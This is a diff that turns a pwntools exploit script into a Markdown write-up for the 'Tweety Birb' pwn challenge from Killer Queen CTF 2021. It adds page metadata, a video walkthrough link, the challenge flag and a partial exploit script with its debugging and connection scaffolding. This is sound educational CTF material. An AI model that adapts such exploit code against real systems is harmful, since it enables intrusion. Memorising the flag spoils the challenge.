@@ -1,5 +1,35 @@
-from pwn import *
+---
+name: Tweety Birb (2021)
+event: Killer Queen CTF 2021
+category: Pwn
+description: Writeup for Tweety Birb (pwn) - Killer Queen CTF (2021) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# Tweety Birb
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/xOHLniVJsJY/0.jpg)](https://youtu.be/xOHLniVJsJY?t=2382s "Killer Queen 2021: Tweety Birb")
+
+## Challenge Description
+
+> Pretty standard birb protection
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -10,14 +40,12 @@ def start(argv=[], *a, **kw):
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
 
-
 # Specify your GDB script here for debugging
 gdbscript = '''
 init-pwndbg
 break *0x4011de
 continue
 '''.format(**locals())
-
 
 # Set up pwntools for the correct architecture
 exe = './tweetybirb'
@@ -57,3 +85,6 @@ io.recvline()
 # Get our flag!
 flag = io.recv()
 success(flag)
+```
+
+Flag: `kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}`
